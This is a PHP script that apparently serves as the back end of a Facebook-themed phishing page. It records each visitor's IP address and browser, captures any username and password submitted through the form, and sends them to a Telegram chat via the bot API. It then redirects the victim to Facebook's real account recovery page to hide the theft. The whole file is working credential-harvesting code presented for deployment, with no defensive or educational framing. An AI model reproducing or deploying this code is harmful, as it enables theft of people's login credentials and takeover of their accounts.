<?php
// Set content type header early for consistent behavior
header('Content-Type: text/html'); // Changed to HTML for the redirect at the end

// --- Configuration: Use Environment Variables ---
// Get Telegram Bot Token and Chat ID from Vercel Environment Variables
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN');
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID');

// Flag to control Telegram sending.
// This can also be an environment variable if you want to control it externally
$send_to_telegram = true; 

// --- IP and User Agent Logging (executed as soon as the script is accessed) ---
$ipaddress = 'N/A'; // Default value
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // This can contain multiple IPs, the first one is usually the client IP.
    $ipaddress = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // Get only the first IP
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}
$useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
$timestamp = date("Y-m-d H:i:s");

// --- Sanitize inputs (from POST request - this happens after link click and form submission) ---
// Using FILTER_SANITIZE_STRING is deprecated in PHP 8.1+, htmlspecialchars is generally safer.
$email = isset($_POST['username']) ? htmlspecialchars((string)$_POST['username'], ENT_QUOTES, 'UTF-8') : 'N/A';
$pass = isset($_POST['password']) ? htmlspecialchars((string)$_POST['password'], ENT_QUOTES, 'UTF-8') : 'N/A';

// --- Determine if credentials were submitted ---
$credential_submitted = ($email !== 'N/A' && $pass !== 'N/A'); // Changed to AND, usually both are needed

// --- Combined Log Content (prepared to be sent to Telegram, NOT saved to file) ---
$combined_message_content = "Timestamp: " . $timestamp . "\n";
$combined_message_content .= "IP Address: " . $ipaddress . "\n";
$combined_message_content .= "User Agent: " . $useragent . "\n";
$combined_message_content .= "--------------------------------------\n";

if ($credential_submitted) {
    $combined_message_content .= "\n--- Credential Capture ---\n";
    $combined_message_content .= "Username: " . $email . "\n";
    // WARNING: Sending passwords unredacted is a significant security risk.
    // If you absolutely must, ensure you understand the implications.
    $combined_message_content .= "Password: " . $pass . "\n";
    $combined_message_content .= "--------------------------------------\n";
}

// --- Telegram Bot API Integration ---
if ($send_to_telegram) {
    if (empty($telegram_bot_token) || empty($telegram_chat_id)) {
        error_log("ERROR: Telegram Bot Token or Chat ID environment variables are not set. Cannot send message.");
    } elseif (!function_exists('curl_init')) {
        error_log("ERROR: cURL extension is not enabled. Cannot send Telegram message.");
    } else {
        // Send the combined message to Telegram
        $telegram_text_api_url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";

        $ch_text = curl_init();
        curl_setopt($ch_text, CURLOPT_URL, $telegram_text_api_url);
        curl_setopt($ch_text, CURLOPT_POST, true);
        curl_setopt($ch_text, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id' => $telegram_chat_id,
            'text' => $combined_message_content, // Send the prepared message
            'parse_mode' => 'HTML' // Ensure Telegram interprets HTML tags if you use them
        ]));
        curl_setopt($ch_text, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch_text, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch_text, CURLOPT_SSL_VERIFYHOST, 2);

        $telegram_response_text = curl_exec($ch_text);
        $curl_error_text = curl_error($ch_text);
        curl_close($ch_text);

        if ($curl_error_text) {
            error_log("Telegram Text cURL Error: " . $curl_error_text);
        } else {
            $response_data_text = json_decode($telegram_response_text, true);
            if (!$response_data_text['ok']) {
                error_log("Telegram Text API Error: " . ($response_data_text['description'] ?? 'Unknown Telegram API Error') . " Response: " . $telegram_response_text);
            }
        }
        // Removed the sendTelegramDocument call as file logging is removed
    }
} else {
    error_log("Telegram notification skipped as 'send_to_telegram' is set to false.");
}

// --- Redirect the user ---
header('Location: https://facebook.com/recover/initiate/');
exit();

?>